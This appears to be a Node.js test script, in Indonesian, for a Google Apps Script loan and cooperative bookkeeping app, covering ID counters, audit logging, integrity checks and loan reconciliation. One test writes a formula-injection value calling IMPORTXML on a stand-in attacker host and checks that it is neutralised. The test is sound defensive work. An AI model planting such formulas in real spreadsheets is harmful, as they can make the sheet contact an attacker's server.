const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { createMockSpreadsheetFromFixture, buildGasGlobals } = require('../mocks/GasMocks');

function loadGasFile(context, file) {
  const code = fs.readFileSync(path.join(__dirname, '..', 'src', file), 'utf8');
  vm.runInContext(code, context, { filename: file });
}

let pass = 0;
let fail = 0;
function assertEqual(actual, expected, label) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  console.log((ok ? 'PASS' : 'FAIL') + ' - ' + label +
    (ok ? '' : ` (dapat: ${JSON.stringify(actual)}, harap: ${JSON.stringify(expected)})`));
  ok ? pass++ : fail++;
}
function assertTrue(actual, label) { assertEqual(!!actual, true, label); }

const fixture = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures', 'sample_spreadsheet.json'), 'utf8'));
const mockSs = createMockSpreadsheetFromFixture(fixture);
const globals = buildGasGlobals(mockSs, { SPREADSHEET_ID: 'FAKE_ID' });
globals.AppError = class AppError extends Error {
  constructor(code, message) { super(message); this.name = 'AppError'; this.code = code; }
};

const context = vm.createContext(globals);
['Config.gs', 'Utils.gs', 'SheetRepository.gs', 'Auth.gs', 'TransactionService.gs', 'IdGenerator.gs',
  'AuditService.gs', 'CalculationService.gs', 'ReportService.gs', 'IntegrityService.gs']
  .forEach((f) => loadGasFile(context, f));

function call(fnName) {
  const args = Array.prototype.slice.call(arguments, 1);
  globals.__args = args;
  const argRefs = args.map((_, i) => `__args[${i}]`).join(',');
  return vm.runInContext(`${fnName}(${argRefs})`, context);
}

const ADMIN_USER = { user_id: 'USR-00001', email: 'admin@tvri.go.id', nama: 'Admin', role: 'ADMIN', status: 'AKTIF' };

console.log('=== IdGenerator.gs ===');
// Fixture CONFIG sudah punya COUNTER_PJ_2026 = 3 (mengikuti 3 data contoh pinjaman)
const idA = call('nextId', 'PINJAMAN');
const idB = call('nextId', 'PINJAMAN');
assertEqual(idA, 'PJ-2026-00004', 'nextId(PINJAMAN) pertama lanjut dari counter contoh -> PJ-2026-00004');
assertEqual(idB, 'PJ-2026-00005', 'nextId(PINJAMAN) kedua -> PJ-2026-00005 (tidak mengulang idA)');
assertTrue(idA !== idB, 'Dua panggilan berturutan menghasilkan ID BERBEDA (dasar uji duplikasi, Tahap 6 §42)');

const idUsr = call('nextId', 'USERS');
assertEqual(idUsr, 'USR-00002', 'nextId(USERS) tanpa tahun, lanjut dari COUNTER_USR=1 -> USR-00002');

console.log('\n=== AuditService.gs ===');
const logId1 = call('logActivity', ADMIN_USER, 'CREATE', 'PINJAMAN', idA, 'Uji audit log');
const auditRows = call('getAllRecords', 'AUDIT_LOG');
assertEqual(auditRows.length, 1, 'AUDIT_LOG bertambah 1 baris setelah logActivity()');
assertEqual(auditRows[0].log_id, logId1, 'log_id di sheet cocok dengan nilai balik logActivity()');
assertEqual(auditRows[0].user, 'admin@tvri.go.id', 'Kolom user terisi email pelaku, bukan nama bebas');
assertEqual(auditRows[0].action, 'CREATE', 'Kolom action sesuai parameter');

const logId2 = call('logActivity', ADMIN_USER, 'VOID', 'PEMBAYARAN', 'BY-2026-00009', 'Salah input nominal');
assertTrue(logId1 !== logId2, 'Dua log berturutan punya log_id berbeda');

console.log('\n=== SheetRepository.gs — sanitasi formula injection (Tahap 6 §33/§68) ===');
call('appendRecord', 'INFAQ', {
  transaction_id: 'IF-2026-TEST', member_id: '', tanggal: '2026-08-23',
  nominal: 1000, metode: 'TUNAI', petugas: 'admin@tvri.go.id',
  keterangan: '=IMPORTXML("http://evil.example/","//a")', created_at: '2026-08-23',
  status_transaksi: 'NORMAL', ref_koreksi: ''
});
const injected = call('findRecordById', 'INFAQ', 'transaction_id', 'IF-2026-TEST');
assertTrue(injected.keterangan.charAt(0) === "'", 'Nilai yang diawali "=" ditulis dengan prefiks apostrof (dicegah jadi formula)');
assertTrue(injected.keterangan.indexOf('IMPORTXML') > -1, 'Isi teks aslinya tetap tersimpan (bukan hilang, hanya dinetralkan)');

console.log('\n=== IntegrityService.gs — terhadap data contoh ASLI (harus 0 orphan, 0 duplicate) ===');
assertEqual(call('findOrphanRecords'), [], 'findOrphanRecords() = 0 temuan pada data contoh yang sudah diserahkan');
assertEqual(call('findDuplicateIds'), [], 'findDuplicateIds() = 0 temuan pada data contoh yang sudah diserahkan');

const reconcilePJ1 = call('reconcileLoan', 'PJ-2026-00001');
assertEqual(reconcilePJ1.consistent, true, 'reconcileLoan(PJ-2026-00001): status DICAIRKAN konsisten dengan sisa > 0');
const reconcilePJ2 = call('reconcileLoan', 'PJ-2026-00002');
assertEqual(reconcilePJ2.consistent, true, 'reconcileLoan(PJ-2026-00002): status LUNAS konsisten dengan sisa = 0');

// Uji reconcileLoan MENDETEKSI inkonsistensi: pinjaman baru yang lunas tapi status belum diupdate
call('appendRecord', 'PINJAMAN', {
  loan_id: 'PJ-2026-TEST', member_id: 'MBR-2026-00001', tanggal_pengajuan: '2026-01-01',
  nominal_pengajuan: 1000000, tanggal_persetujuan: '2026-01-02', tanggal_pencairan: '2026-01-03',
  nominal_pencairan: 1000000, tujuan: 'Test', status: 'DICAIRKAN', petugas: 'admin@tvri.go.id',
  keterangan: '', created_at: '2026-01-01', updated_at: '2026-01-01', status_transaksi: 'NORMAL', ref_koreksi: ''
});
call('appendRecord', 'PEMBAYARAN', {
  payment_id: 'BY-2026-TEST', loan_id: 'PJ-2026-TEST', member_id: 'MBR-2026-00001', tanggal: '2026-01-10',
  nominal: 1000000, metode: 'TUNAI', petugas: 'admin@tvri.go.id', keterangan: 'Lunas sekali bayar',
  created_at: '2026-01-10', status_transaksi: 'NORMAL', ref_koreksi: ''
});
const reconcileTest = call('reconcileLoan', 'PJ-2026-TEST');
assertEqual(reconcileTest.consistent, false, 'reconcileLoan MENDETEKSI ketidakkonsistenan: sisa=0 tapi status DB masih DICAIRKAN (belum di-auto-update LUNAS oleh PembayaranService yang belum dibangun)');

console.log('\n' + pass + ' PASS, ' + fail + ' FAIL');
process.exit(fail > 0 ? 1 : 0);
